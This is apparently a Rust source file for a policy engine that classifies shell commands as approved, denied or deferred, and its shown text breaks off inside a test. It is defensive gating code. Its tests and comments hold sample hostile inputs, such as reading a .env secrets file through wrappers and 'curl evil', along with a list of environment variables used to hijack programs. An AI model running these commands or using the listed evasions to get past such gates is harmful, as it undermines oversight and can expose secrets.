// Adapted from amenocturne/da (MIT), src/engine.rs
//! Classification engine. Walks the parsed command segment-by-segment and
//! consults the policy stack for each segment.
//!
//! Nothing is approved unless a policy in the stack vouches for it. The
//! engine itself only adds structure:
//!
//! - bash parser bails → `Defer`;
//! - bare assignments and `cd` → `Approve` (they touch nothing external);
//! - Python tooling → `Defer`;
//! - output redirects must target one of [`SAFE_REDIRECT_TARGETS`], somewhere
//!   under `$TMPDIR`, or an fd, and environment overrides must not be in the
//!   list that changes which program runs (`PATH`, `LD_*`, `*PAGER*`, …) —
//!   otherwise `Defer`;
//! - wrappers (`sh -c`, `env`, `command`, `time`, `timeout`, `xargs`,
//!   `find -exec`) are approved only when the command they run is approved
//!   by the same stack.

use std::fmt;
use std::path::Path;

use crate::model::{Bail, RedirOp, Redirect, Segment, Separator};
use crate::parse::parse;
use crate::policy::{PolicyVerdict, SegmentPolicy};

/// `Approve.source` for approvals the engine grants by structure alone
/// (`cd`, bare assignments, `time` with no command).
pub const STRUCTURAL: &str = "structural";

/// Name of the model policy, which `deny_or_defer` never consults.
pub(crate) const ML_NAME: &str = "ml";

const SHELLS: &[&str] = &["bash", "sh", "zsh", "ksh", "csh", "tcsh", "fish", "dash"];

const PYTHON_TOOLS: &[&str] = &[
    "python", "python3", "pypy", "ipython", "uv", "uvx", "pip", "pipx", "pipenv", "poetry",
    "hatch", "rye", "pixi", "conda", "mamba", "pytest", "tox", "nox",
];

const SAFE_REDIRECT_TARGETS: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/stdin"];

/// `sh -c 'sh -c "…"'` nesting the engine is willing to follow.
const MAX_DEPTH: usize = 8;

/// The engine's answer for a whole command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// Every segment was approved. `source` names the vouching policy, or
    /// [`STRUCTURAL`] when only the engine's own no-op rules applied. For a
    /// command of several segments (or a wrapper over several commands) it is
    /// the first vouching policy in command order that is not structural, so
    /// `cd src && ls` reports `"read-only"`; it is `"structural"` only when
    /// every segment was structural.
    Approve { source: &'static str },
    /// At least one segment was actively denied by a policy; `source` is the
    /// policy's name (`"ml"` for the model stage, whose deny is only advice).
    Deny { source: &'static str },
    /// No policy spoke up for at least one segment, or the parser bailed.
    Defer,
}

/// Why a command was not approved: what the first offending thing was.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reason {
    /// The parser refused the command.
    Bail(Bail),
    /// Nothing to run.
    Empty,
    /// `sh -c` nesting beyond the supported depth.
    TooDeep,
    /// A segment denied by a policy that said what matched: the segment's
    /// words and the policy's explanation.
    Denied { text: String, detail: String },
    /// The first segment that was denied or not vouched for: its words
    /// joined by single spaces (or its assignments, when it has no words).
    Segment(String),
}

impl fmt::Display for Reason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Reason::Bail(b) => write!(f, "unsupported shell syntax ({b:?})"),
            Reason::Empty => f.write_str("empty command"),
            Reason::TooDeep => f.write_str("shell invocations nested too deeply"),
            Reason::Segment(text) => f.write_str(text),
            Reason::Denied { text, detail } => write!(f, "{text}: {detail}"),
        }
    }
}

/// Like [`classify_stack`] but with the structured [`Reason`], for callers
/// that want to phrase parser bails themselves.
pub fn classify_stack_reason(
    cmd: &str,
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
) -> (Decision, Option<Reason>) {
    classify_script(cmd, cwd, stack, 0)
}

/// Parse `cmd`, then for each segment ask the policy stack — first policy
/// with an opinion wins. The whole command approves only if every segment
/// approves; any `Deny` denies the whole command; anything unmatched defers.
/// The reason (for `Deny` and `Defer`) is the text of the first segment that
/// was denied / not vouched for, or a description of the parser bail.
///
/// An empty stack approves nothing beyond the structural no-ops (`cd`, bare
/// assignments).
pub fn classify_stack(
    cmd: &str,
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
) -> (Decision, Option<String>) {
    let (d, r) = classify_stack_reason(cmd, cwd, stack);
    (d, r.map(|r| r.to_string()))
}

type Res = (Decision, Option<Reason>);

/// Folds the results of several segments into one.
struct Fold {
    source: Option<&'static str>,
    defer: Option<Reason>,
    deferred: bool,
}

impl Fold {
    fn new() -> Self {
        Fold {
            source: None,
            defer: None,
            deferred: false,
        }
    }

    /// Add one result; `Some` when the fold is already decided (a deny).
    fn push(&mut self, (d, reason): Res) -> Option<Res> {
        match d {
            Decision::Approve { source } => {
                if self.source.is_none_or(|s| s == STRUCTURAL) {
                    self.source = Some(source);
                }
                None
            }
            Decision::Deny { source } => Some((Decision::Deny { source }, reason)),
            Decision::Defer => {
                if !self.deferred {
                    self.deferred = true;
                    self.defer = reason;
                }
                None
            }
        }
    }

    fn finish(self) -> Res {
        if self.deferred {
            (Decision::Defer, self.defer)
        } else {
            (
                Decision::Approve {
                    source: self.source.unwrap_or(STRUCTURAL),
                },
                None,
            )
        }
    }
}

fn classify_script(
    cmd: &str,
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
    depth: usize,
) -> Res {
    if depth > MAX_DEPTH {
        return (Decision::Defer, Some(Reason::TooDeep));
    }
    let segs = match parse(cmd) {
        Ok(s) if !s.is_empty() => s,
        Ok(_) => return (Decision::Defer, Some(Reason::Empty)),
        Err(b) => return (Decision::Defer, Some(Reason::Bail(b))),
    };
    // I2: a hard deny anywhere in the whole command (wrapper contents and
    // `sh -c` scripts included) wins before any policy, the model above all,
    // is asked to approve or deny an earlier segment. Nested scripts are
    // scanned by the recursion here, so only the outermost call scans.
    if depth == 0
        && let Some(done) = deny_scan(&segs, cwd, stack, 0)
    {
        return done;
    }
    classify_all(&segs, cwd, stack, depth)
}

/// The first hard deny among `segs` and everything they run (wrapper inners,
/// `sh -c` scripts), as written. Withholds are not looked at here.
fn deny_scan(
    segs: &[Segment],
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
    depth: usize,
) -> Option<Res> {
    if depth > MAX_DEPTH {
        return None;
    }
    for seg in segs {
        if let Screen::Deny(res) = screen(seg, cwd, stack) {
            return Some(res);
        }
        if seg.argv.is_empty() || seg.is_dynamic(0) {
            continue;
        }
        let binary = argv0_name(&seg.argv[0]);
        if SHELLS.contains(&binary) {
            if let Some(i) = shell_c_index(seg)
                && let Ok(inner) = parse(&seg.argv[i])
                && let Some(done) = deny_scan(&inner, cwd, stack, depth + 1)
            {
                return Some(done);
            }
        } else if let Some(Unwrapped::Inner(inner)) = unwrap_wrapper(seg, binary)
            && let Some(done) = deny_scan(&inner, cwd, stack, depth)
        {
            return Some(done);
        }
    }
    None
}

/// What a wrapper command (`env`, `time`, `xargs`, …) runs, if `binary` is
/// one and its form is understood.
fn unwrap_wrapper(seg: &Segment, binary: &str) -> Option<Unwrapped> {
    match binary {
        "command" => unwrap_command(seg),
        "env" => unwrap_env(seg),
        "time" => unwrap_time(seg),
        "timeout" => unwrap_timeout(seg),
        "xargs" => unwrap_xargs(seg),
        "find" => unwrap_find_exec(seg),
        _ => None,
    }
}

fn classify_all(
    segs: &[Segment],
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
    depth: usize,
) -> Res {
    let mut fold = Fold::new();
    for seg in segs {
        if let Some(done) = fold.push(classify_segment(seg, cwd, stack, depth)) {
            return done;
        }
    }
    fold.finish()
}

/// The text a reason quotes for a segment.
fn segment_text(seg: &Segment) -> String {
    if seg.argv.is_empty() {
        seg.assigns
            .iter()
            .map(|(n, v)| format!("{n}={v}"))
            .collect::<Vec<_>>()
            .join(" ")
    } else {
        seg.argv.join(" ")
    }
}

fn defer(seg: &Segment) -> Res {
    (Decision::Defer, Some(Reason::Segment(segment_text(seg))))
}

fn structural() -> Res {
    (Decision::Approve { source: STRUCTURAL }, None)
}

fn classify_segment(
    seg: &Segment,
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
    depth: usize,
) -> Res {
    // Deny rules see the segment as written first, so a wrapper's own
    // redirects and arguments (`xargs cat < .env`) are checked even though
    // the wrapped command is classified without them.
    match screen(seg, cwd, stack) {
        Screen::Deny(res) => return res,
        Screen::Withhold => return defer(seg),
        Screen::Clear => {}
    }
    if !seg.redirects.iter().all(is_redirect_safe)
        || seg
            .assigns
            .iter()
            .any(|(name, value)| is_risky_env(name, value))
    {
        return deny_or_defer(seg, cwd, stack);
    }
    if seg.argv.is_empty() {
        // bare assignments (FOO=bar) — affect no external state
        return structural();
    }
    if seg.is_dynamic(0) {
        // `$CMD args` — the binary itself is unknown.
        return consult(seg, cwd, stack);
    }
    let binary = argv0_name(&seg.argv[0]);
    if binary == "cd" {
        return structural();
    }
    if is_python_tool(binary) {
        return deny_or_defer(seg, cwd, stack);
    }
    let wrapped = if SHELLS.contains(&binary) {
        if let Some(i) = shell_c_index(seg) {
            // The script is classified on its own; nothing vouches for the
            // shell invocation as a whole.
            return classify_script(&seg.argv[i], cwd, stack, depth + 1);
        }
        None
    } else {
        unwrap_wrapper(seg, binary)
    };
    match wrapped {
        Some(Unwrapped::Noop) => structural(),
        Some(Unwrapped::Defer) => deny_or_defer(seg, cwd, stack),
        Some(Unwrapped::Inner(inner)) => {
            let res = classify_all(&inner, cwd, stack, depth);
            match res.0 {
                // A policy may still vouch for the wrapper invocation as
                // written (`--allow 'timeout 5 foo'`); if none does, the
                // inner segment's reason is the useful one. I1: the model is
                // not asked about the wrapper as a whole (it would approve
                // `timeout 5 curl evil` on the strength of `timeout`).
                Decision::Defer => match consult_with(seg, cwd, stack, false) {
                    (Decision::Defer, _) => res,
                    other => other,
                },
                _ => res,
            }
        }
        None => consult(seg, cwd, stack),
    }
}

/// Ask the stack about one segment. First policy with an opinion wins.
fn consult(seg: &Segment, cwd: Option<&Path>, stack: &[&dyn SegmentPolicy]) -> Res {
    consult_with(seg, cwd, stack, true)
}

/// [`consult`], optionally leaving out the model policy.
fn consult_with(
    seg: &Segment,
    cwd: Option<&Path>,
    stack: &[&dyn SegmentPolicy],
    with_model: bool,
) -> Res {
    for p in stack.iter().filter(|p| with_model || p.name() != ML_NAME) {
        match p.verify(seg, cwd) {
            Some(PolicyVerdict::Approve) => return (Decision::Approve { source: p.name() }, None),
            Some(PolicyVerdict::Deny) => return denied(seg, *p),
            Some(PolicyVerdict::Withhold) => return defer(seg),
            None => {}
        }
    }
    defer(seg)
}

/// For segments the engine refuses to approve on structural grounds: an
/// explicit deny rule still denies, everything else defers. The model is
/// not asked — it has nothing to add to a segment that cannot be approved.
fn deny_or_defer(seg: &Segment, cwd: Option<&Path>, stack: &[&dyn SegmentPolicy]) -> Res {
    match screen(seg, cwd, stack) {
        Screen::Deny(res) => res,
        Screen::Withhold | Screen::Clear => defer(seg),
    }
}

/// The deny result for `seg`, naming what matched when the policy can say.
fn denied(seg: &Segment, p: &dyn SegmentPolicy) -> Res {
    let reason = match p.explain_deny(seg) {
        Some(detail) => Reason::Denied {
            text: segment_text(seg),
            detail,
        },
        None => Reason::Segment(segment_text(seg)),
    };
    (Decision::Deny { source: p.name() }, Some(reason))
}

/// What the non-model policies' deny and withhold verdicts say about a
/// segment as written. A deny anywhere beats a withhold.
enum Screen {
    Deny(Res),
    Withhold,
    Clear,
}

fn screen(seg: &Segment, cwd: Option<&Path>, stack: &[&dyn SegmentPolicy]) -> Screen {
    let mut withhold = false;
    for p in stack.iter().filter(|p| p.name() != ML_NAME) {
        match p.verify(seg, cwd) {
            Some(PolicyVerdict::Deny) => return Screen::Deny(denied(seg, *p)),
            Some(PolicyVerdict::Withhold) => withhold = true,
            Some(PolicyVerdict::Approve) | None => {}
        }
    }
    if withhold {
        Screen::Withhold
    } else {
        Screen::Clear
    }
}

/// What a wrapper invocation boils down to.
enum Unwrapped {
    /// Runs nothing (`time`, `command` with no arguments).
    Noop,
    /// Runs these commands; every one must be approved.
    Inner(Vec<Segment>),
    /// Recognised, but in a form the engine will not approve.
    Defer,
}

/// A new segment made of `seg.argv[from..to]`, keeping the dynamic marks.
fn sub_segment(seg: &Segment, from: usize, to: usize) -> Segment {
    Segment {
        assigns: Vec::new(),
        argv: seg.argv[from..to].to_vec(),
        dynamic: (from..to).map(|i| seg.is_dynamic(i)).collect(),
        redirects: Vec::new(),
        follows: Separator::End,
    }
}

fn tail_segment(seg: &Segment, from: usize) -> Segment {
    sub_segment(seg, from, seg.argv.len())
}

/// `command [-p] cmd…` runs `cmd`. `command -v/-V name` is a lookup and is
/// left to the policy stack (the read-only policy recognises it).
fn unwrap_command(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') && !seg.is_dynamic(i) {
        if argv[i] != "-p" {
            return None;
        }
        i += 1;
    }
    if i >= argv.len() {
        return Some(Unwrapped::Noop);
    }
    Some(Unwrapped::Inner(vec![tail_segment(seg, i)]))
}

/// `env [-i] [-u NAME] [-C DIR] [VAR=val…] cmd…` runs `cmd`. Bare `env`
/// prints the environment and is left to the policy stack.
fn unwrap_env(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') {
        if seg.is_dynamic(i) {
            return None;
        }
        match argv[i].as_str() {
            // An emptied environment unsets `$TMPDIR`/`$PATH` too, which
            // changes what the `$TMPDIR` redirect carve-out points at.
            "-" | "-i" | "--ignore-environment" => return Some(Unwrapped::Defer),
            "-C" | "--chdir" => i += 2,
            "-u" | "--unset" => {
                if unset_is_risky(seg, i + 1) {
                    return Some(Unwrapped::Defer);
                }
                i += 2;
            }
            t if t.starts_with("--chdir=") => i += 1,
            t if t.starts_with("--unset=") => {
                if is_risky_env(&t["--unset=".len()..], "") {
                    return Some(Unwrapped::Defer);
                }
                i += 1;
            }
            t if t.starts_with("-u") && !t.starts_with("--") => {
                if is_risky_env(&t[2..], "") {
                    return Some(Unwrapped::Defer);
                }
                i += 1;
            }
            // `-S` splits a string into a command line; anything else is
            // not understood.
            _ => return None,
        }
    }
    let mut risky = false;
    while i < argv.len() && is_env_assignment(&argv[i]) {
        let (name, value) = argv[i].split_once('=').unwrap_or((&argv[i], ""));
        risky |= is_risky_env(name, value);
        i += 1;
    }
    if risky {
        return Some(Unwrapped::Defer);
    }
    if i >= argv.len() {
        return None;
    }
    Some(Unwrapped::Inner(vec![tail_segment(seg, i)]))
}

/// Whether the `env -u NAME` operand at `argv[at]` is missing, dynamic or a
/// variable the engine treats as risky (unsetting it changes behaviour).
fn unset_is_risky(seg: &Segment, at: usize) -> bool {
    match seg.argv.get(at) {
        Some(name) => seg.is_dynamic(at) || is_risky_env(name, ""),
        None => true,
    }
}

/// `time [-p] cmd…`. Other flags (`-o FILE` writes a report) are not
/// understood.
fn unwrap_time(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') {
        if seg.is_dynamic(i) || !matches!(argv[i].as_str(), "-p" | "-l" | "-h" | "-v") {
            return None;
        }
        i += 1;
    }
    if i >= argv.len() {
        return Some(Unwrapped::Noop);
    }
    Some(Unwrapped::Inner(vec![tail_segment(seg, i)]))
}

/// `timeout [-s SIG] [-k DUR] [--foreground] [--preserve-status] DUR cmd…`.
fn unwrap_timeout(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') {
        if seg.is_dynamic(i) {
            return None;
        }
        match argv[i].as_str() {
            "--foreground" | "--preserve-status" | "-v" | "--verbose" => i += 1,
            "-s" | "-k" | "--signal" | "--kill-after" => i += 2,
            t if t.starts_with("--signal=") || t.starts_with("--kill-after=") => i += 1,
            _ => return None,
        }
    }
    let duration = argv.get(i)?;
    if seg.is_dynamic(i) || !is_duration(duration) {
        return None;
    }
    i += 1;
    if i >= argv.len() {
        return None;
    }
    Some(Unwrapped::Inner(vec![tail_segment(seg, i)]))
}

fn is_duration(s: &str) -> bool {
    let digits = s.strip_suffix(['s', 'm', 'h', 'd']).unwrap_or(s);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit() || c == '.')
}

/// `xargs [flags] cmd…` runs `cmd` with words read from stdin appended (or
/// substituted for the `-I` placeholder). Those words are unknown here, so
/// the inner command is classified with a dynamic operand in their place:
/// only commands that are safe for any operand get approved.
fn unwrap_xargs(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    let mut i = 1;
    let mut replace: Option<String> = None;
    while i < argv.len() && argv[i].starts_with('-') {
        if seg.is_dynamic(i) {
            return None;
        }
        let t = argv[i].as_str();
        match t {
            "--null" | "--no-run-if-empty" | "--verbose" | "--exit" => i += 1,
            _ if t.len() > 1 && t[1..].chars().all(|c| "0rtx".contains(c)) => i += 1,
            "-n" | "-P" | "-L" | "-s" | "-d" | "-E" | "-a" => i += 2,
            "-I" | "-J" => {
                replace = Some(argv.get(i + 1)?.clone());
                i += 2;
            }
            _ if t.starts_with("--max-args=")
                || t.starts_with("--max-procs=")
                || t.starts_with("--max-lines=")
                || t.starts_with("--max-chars=")
                || t.starts_with("--delimiter=")
                || t.starts_with("--arg-file=") =>
            {
                i += 1
            }
            _ if t.starts_with("--replace=") => {
                replace = Some(t["--replace=".len()..].to_string());
                i += 1;
            }
            _ if t.starts_with("-I") => {
                replace = Some(t[2..].to_string());
                i += 1;
            }
            _ if t.len() > 2
                && ["-n", "-P", "-L", "-s", "-d"]
                    .iter()
                    .any(|f| t.starts_with(f)) =>
            {
                i += 1
            }
            _ => return None,
        }
    }
    let mut inner = if i >= argv.len() {
        // xargs with no command runs `echo`.
        Segment {
            assigns: Vec::new(),
            argv: vec!["echo".to_string()],
            dynamic: vec![false],
            redirects: Vec::new(),
            follows: Separator::End,
        }
    } else {
        tail_segment(seg, i)
    };
    match replace {
        Some(marker) if !marker.is_empty() => {
            for (k, word) in inner.argv.iter().enumerate() {
                if word.contains(&marker) {
                    inner.dynamic[k] = true;
                }
            }
        }
        _ => {
            inner.argv.push("xargs-operand".to_string());
            inner.dynamic.push(true);
        }
    }
    Some(Unwrapped::Inner(vec![inner]))
}

/// `find … -exec cmd {} ;` runs `cmd` once per match. The `find` expression
/// without its `-exec` clauses and each clause's command are classified
/// separately; `{}` stands for an unknown path.
fn unwrap_find_exec(seg: &Segment) -> Option<Unwrapped> {
    let argv = &seg.argv;
    if !argv.iter().any(|t| t == "-exec" || t == "-execdir") {
        return None;
    }
    let mut rest = Segment {
        assigns: Vec::new(),
        argv: Vec::new(),
        dynamic: Vec::new(),
        redirects: Vec::new(),
        follows: Separator::End,
    };
    let mut inner = Vec::new();
    let mut i = 0;
    while i < argv.len() {
        if (argv[i] == "-exec" || argv[i] == "-execdir") && !seg.is_dynamic(i) {
            let start = i + 1;
            let mut end = start;
            loop {
                let t = argv.get(end)?;
                if !seg.is_dynamic(end) && (t == ";" || (t == "+" && end > start)) {
                    break;
                }
                end += 1;
            }
            if end == start {
                return None;
            }
            let mut clause = sub_segment(seg, start, end);
            for (k, word) in clause.argv.iter().enumerate() {
                if word.contains("{}") {
                    clause.dynamic[k] = true;
                }
            }
            inner.push(clause);
            i = end + 1;
        } else {
            rest.argv.push(argv[i].clone());
            rest.dynamic.push(seg.is_dynamic(i));
            i += 1;
        }
    }
    inner.push(rest);
    Some(Unwrapped::Inner(inner))
}

/// The command name policies match on. C1: a path-qualified argv[0]
/// (`./cat`, `bin/git`, `/usr/bin/ls`) is returned whole, so it matches no
/// rule: the checkout is attacker-controlled and may hold an executable named
/// like a safe tool. (Deliberate divergence from da, which strips directories.)
/// `RepoAllow` compares raw argv and is unaffected.
pub(crate) fn argv0_name(s: &str) -> &str {
    s
}

/// Prefixes under which a redirect target counts as "somewhere under
/// `$TMPDIR`". The parser unquotes such words (`"$TMPDIR"/x` arrives as
/// `$TMPDIR/x`), so only the two unquoted spellings are needed.
const TMPDIR_PREFIXES: &[&str] = &["$TMPDIR/", "${TMPDIR}/"];

/// `$TMPDIR/…` in one of the [`TMPDIR_PREFIXES`] spellings, with a remainder
/// that is a plain relative path: no further expansion, no quotes or
/// backslashes, no glob/brace/tilde metacharacters (bash glob-expands
/// redirect targets, so `.[.]` would match `..`), no whitespace or control
/// characters, no `..` component.
fn is_tmpdir_target(target: &str) -> bool {
    let Some(rest) = TMPDIR_PREFIXES.iter().find_map(|p| target.strip_prefix(p)) else {
        return false;
    };
    !rest.is_empty()
        && !rest.contains(['$', '`', '"', '\'', '\\', '*', '?', '[', ']', '{', '}', '~'])
        && !rest.chars().any(|c| c.is_whitespace() || c.is_control())
        && !rest.split('/').any(|c| c == "..")
}

/// Reading a file is read-only; writing is allowed only to the null/std
/// devices, somewhere under `$TMPDIR`, or an fd (`2>&1`, `>&2`, `>&-`).
fn is_redirect_safe(r: &Redirect) -> bool {
    let safe_file =
        SAFE_REDIRECT_TARGETS.contains(&r.target.as_str()) || is_tmpdir_target(&r.target);
    match r.op {
        RedirOp::In => true,
        RedirOp::OutDup | RedirOp::InDup => {
            r.target == "-"
                || (!r.target.is_empty() && r.target.chars().all(|c| c.is_ascii_digit()))
                || safe_file
        }
        _ => safe_file,
    }
}

pub(crate) fn is_env_assignment(s: &str) -> bool {
    let Some(eq) = s.find('=') else { return false };
    let name = &s[..eq];
    !name.is_empty()
        && !name.starts_with(|c: char| c.is_ascii_digit())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Environment variables that change which program a command ends up
/// running or which configuration it loads: search paths, preloads, pagers,
/// editors, tool option strings. A command carrying such an override is not
/// what its argv says it is. Setting a pager to `cat` (or to nothing) is the
/// one harmless, common case.
///
/// This is a list of known offenders, not a proof: an arbitrary tool may
/// honour a variable that is not here.
pub(crate) fn is_risky_env(name: &str, value: &str) -> bool {
    const EXACT: &[&str] = &[
        "PATH",
        "TMPDIR",
        "IFS",
        // A non-null GLOBIGNORE turns dotglob on, so `*.env` reaches `.env`.
        "GLOBIGNORE",
        "ENV",
        "BASH_ENV",
        "SHELL",
        "SHELLOPTS",
        "BASHOPTS",
        "PS4",
        "PROMPT_COMMAND",
        "HOME",
        "XDG_CONFIG_HOME",
        "ZDOTDIR",
        "VISUAL",
        "MANOPT",
        "GREP_OPTIONS",
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "FFREPORT",
    ];
    const PREFIXES: &[&str] = &[
        "LD_",
        "DYLD_",
        // C2a: every GIT_* variable (GIT_DIR, GIT_WORK_TREE, GIT_INDEX_FILE,
        // GIT_OBJECT_DIRECTORY, GIT_TRACE*, GIT_SSH, GIT_CONFIG_*, …) can point
        // git at a PR-controlled repository or make it write a file. The one
        // exemption is the harmless pager spelling (`GIT_PAGER=cat`) below.
        "GIT_",
        "BASH_FUNC",
        "PERL5",
        "PERLLIB",
        "PYTHON",
        "RUBY",
        "NODE_OPTIONS",
        "NODE_PATH",
        "LESS",
        "FZF_",
        "BAT_",
        "RIPGREP_",
    ];
    const FRAGMENTS: &[&str] = &["PAGER", "EDITOR", "ASKPASS"];
    const SUFFIXES: &[&str] = &["_COMMAND", "_WRAPPER"];

    let risky = EXACT.contains(&name)
        || PREFIXES.iter().any(|p| name.starts_with(p))
        || FRAGMENTS.iter().any(|f| name.contains(f))
        || SUFFIXES.iter().any(|s| name.ends_with(s));
    if !risky {
        return false;
    }
    let pager = name.contains("PAGER");
    !(pager && (value.is_empty() || value == "cat"))
}

fn is_python_tool(binary: &str) -> bool {
    PYTHON_TOOLS.contains(&binary)
        || binary.starts_with("python")
        || binary.starts_with("pypy")
        || binary.starts_with("ipython")
        || binary.starts_with("pip")
}

/// Index of the script argument of `sh [-flags] -c SCRIPT`, when the script
/// is a literal and everything before it is a plain letter cluster (`-l`,
/// `-ec`). Long options (`--rcfile`, `--init-file`) load other files and
/// are not understood.
fn shell_c_index(seg: &Segment) -> Option<usize> {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() {
        let arg = argv[i].as_str();
        let cluster = arg.strip_prefix('-')?;
        if seg.is_dynamic(i)
            || cluster.is_empty()
            || !cluster.chars().all(|c| c.is_ascii_alphabetic())
        {
            return None;
        }
        if cluster.contains('c') {
            if i + 1 < argv.len() && !seg.is_dynamic(i + 1) {
                return Some(i + 1);
            }
            return None;
        }
        if cluster.contains('o') || cluster.contains('O') {
            // `-o option` / `-O shopt` take a value.
            return None;
        }
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policies::{ALL_BUILTIN, READ_ONLY};
    use crate::policy::Policy;

    fn run(cmd: &str, pol: &[&Policy]) -> (Decision, Option<Reason>) {
        let stack: Vec<&dyn SegmentPolicy> = pol.iter().map(|p| *p as &dyn SegmentPolicy).collect();
        classify_stack_reason(cmd, None, &stack)
    }

    fn approved(cmd: &str) -> bool {
        matches!(run(cmd, ALL_BUILTIN).0, Decision::Approve { .. })
    }

    fn deferred(cmd: &str) -> bool {
        matches!(run(cmd, ALL_BUILTIN).0, Decision::Defer)
    }

    fn empty(cmd: &str) -> Decision {
        run(cmd, &[]).0
    }

    static DENY_DOTENV: Policy = Policy {
        name: "test-deny-dotenv",
        verify: |seg, _| {
            let hit = |t: &str| t.contains(".env");
            (seg.argv.iter().any(|a| hit(a)) || seg.redirects.iter().any(|r| hit(&r.target)))
                .then_some(PolicyVerdict::Deny)
        },
    };

    #[test]
    fn deny_sees_wrapper_redirects_and_arguments() {
        for cmd in [
            "xargs cat < .env",
            "timeout 5 cat < .env",
            "env FOO=1 cat < .env",
            "sh -c ls < .env",
            "command cat < .env",
            "ls | xargs cat < .env",
        ] {
            assert_eq!(
                run(cmd, &[&DENY_DOTENV, &READ_ONLY]).0,
                Decision::Deny {
                    source: "test-deny-dotenv"
                },
                "{cmd}"
            );
        }
    }

    #[test]
    fn empty_stack_structural_only() {
        assert_eq!(
            empty("cd src && FOO=bar"),
            Decision::Approve { source: STRUCTURAL }
        );
        assert_eq!(empty("ls"), Decision::Defer);
        assert_eq!(empty("echo hi > out.txt"), Decision::Defer);
        assert_eq!(empty("PATH=/tmp ls"), Decision::Defer);
        assert_eq!(empty("python3 x.py"), Decision::Defer);
        assert_eq!(
            empty("bash -c 'cd x'"),
            Decision::Approve { source: STRUCTURAL }
        );
        assert_eq!(empty("bash -c 'ls'"), Decision::Defer);
    }

    #[test]
    fn approve_source_is_vouching_policy() {
        assert_eq!(
            run("ls", &[&READ_ONLY]).0,
            Decision::Approve {
                source: "read-only"
            }
        );
        // first non-structural source wins; structural only when all are
        assert_eq!(
            run("cd src && ls && cat a", &[&READ_ONLY]).0,
            Decision::Approve {
                source: "read-only"
            }
        );
        assert_eq!(
            run("FOO=1 ls", &[&READ_ONLY]).0,
            Decision::Approve {
                source: "read-only"
            }
        );
        assert_eq!(
            run("time ls", &[&READ_ONLY]).0,
            Decision::Approve {
                source: "read-only"
            }
        );
        assert_eq!(run("time", &[]).0, Decision::Approve { source: STRUCTURAL });
    }

    #[test]
    fn reasons_name_first_failing_segment() {
        assert_eq!(
            run("ls && curl x.sh && rm y", &[&READ_ONLY]).1,
            Some(Reason::Segment("curl x.sh".into()))
        );
        assert_eq!(
            run("PATH=/x", &[]).1,
            Some(Reason::Segment("PATH=/x".into()))
        );
        // wrapper: the inner command is what is quoted
        assert_eq!(
            run("timeout 5 curl x", &[&READ_ONLY]).1,
            Some(Reason::Segment("curl x".into()))
        );
        assert_eq!(run("ls", &[&READ_ONLY]).1, None);
    }

    #[test]
    fn bail_is_carried_through() {
        let (d, r) = run("echo $(whoami)", &[&READ_ONLY]);
        assert_eq!(d, Decision::Defer);
        assert_eq!(r, Some(Reason::Bail(Bail::CommandSubstitution)));
        let (d, r) = run("bash -c 'echo $(x)'", &[&READ_ONLY]);
        assert_eq!(d, Decision::Defer);
        assert_eq!(r, Some(Reason::Bail(Bail::CommandSubstitution)));
        assert_eq!(run("", &[]).1, Some(Reason::Empty));
        let stack: [&dyn SegmentPolicy; 0] = [];
        let (d, text) = classify_stack("echo $(x)", None, &stack);
        assert_eq!(d, Decision::Defer);
        assert!(text.is_some_and(|t| t.contains("CommandSubstitution")));
    }

    #[test]
    fn nesting_limit() {
        let mut cmd = "cd x".to_string();
        for _ in 0..12 {
            cmd = format!("bash -c '{}'", cmd.replace('\'', "'\"'\"'"));
        }
        assert_eq!(run(&cmd, &[]).1, Some(Reason::TooDeep));
    }

    struct Named(&'static str, Option<PolicyVerdict>);
    impl SegmentPolicy for Named {
        fn name(&self) -> &'static str {
            self.0
        }
        fn verify(&self, _: &Segment, _: Option<&Path>) -> Option<PolicyVerdict> {
            self.1
        }
    }

    const ML_DENY: Decision = Decision::Deny { source: "ml" };

    #[test]
    fn deny_or_defer_skips_ml_by_name() {
        let ml = Named("ml", Some(PolicyVerdict::Deny));
        let other = Named("rule", Some(PolicyVerdict::Deny));
        let stack: [&dyn SegmentPolicy; 1] = [&ml];
        // structurally refused (file redirect): ml is not consulted
        assert_eq!(classify_stack("echo > f", None, &stack).0, Decision::Defer);
        // but it is consulted for an ordinary segment
        assert_eq!(classify_stack("echo", None, &stack).0, ML_DENY);
        let stack: [&dyn SegmentPolicy; 2] = [&ml, &other];
        assert_eq!(
            classify_stack("echo > f", None, &stack).0,
            Decision::Deny { source: "rule" }
        );
        let approve = Named("ml", Some(PolicyVerdict::Approve));
        let stack: [&dyn SegmentPolicy; 1] = [&approve];
        assert_eq!(classify_stack("echo > f", None, &stack).0, Decision::Defer);
        assert_eq!(
            classify_stack("echo", None, &stack).0,
            Decision::Approve { source: "ml" }
        );
    }

    /// A model stand-in that vouches only for the wrapper words themselves
    /// and has no opinion on what they run.
    struct WrapperOnlyMl;
    impl SegmentPolicy for WrapperOnlyMl {
        fn name(&self) -> &'static str {
            "ml"
        }
        fn verify(&self, seg: &Segment, _: Option<&Path>) -> Option<PolicyVerdict> {
            matches!(
